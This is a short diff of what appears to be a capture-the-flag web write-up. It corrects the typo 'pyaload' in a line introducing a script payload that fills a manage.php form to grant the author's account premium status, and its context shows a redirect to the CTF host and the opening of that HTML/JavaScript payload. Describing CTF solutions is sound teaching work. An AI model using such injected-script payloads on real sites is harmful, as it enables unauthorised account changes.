@@ -59,7 +59,7 @@ window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid
 And observe the new option in menu: manage.php:
 ![](image5.png)
 
-Let’s write a pyaload that fills the form with our uid and gives us premium account:
+Let’s write a payload that fills the form with our uid and gives us premium account:
 ```html
 <script>
 window.name = `
